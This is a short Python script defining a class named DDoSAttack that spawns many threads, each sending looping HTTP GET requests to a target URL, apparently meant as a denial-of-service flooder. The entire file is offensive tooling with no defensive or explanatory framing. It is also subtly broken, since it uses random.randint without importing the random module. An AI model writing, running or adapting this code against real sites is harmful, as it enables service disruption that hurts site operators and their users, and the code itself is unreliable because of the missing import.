import threading
import requests
import time

class DDoSAttack:
    def __init__(self, target_url):
        self.target_url = target_url

    def launch_attack(self, num_threads):
        threads = []
        for _ in range(num_threads):
            thread = threading.Thread(target=self._attack)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

    def _attack(self):
        while True:
            try:
                response = requests.get(self.target_url)
                print(f"Request sent: {response.status_code}")
            except requests.exceptions.RequestException:
                print("Error during attack")
                break
            time.sleep(random.randint(1, 3))
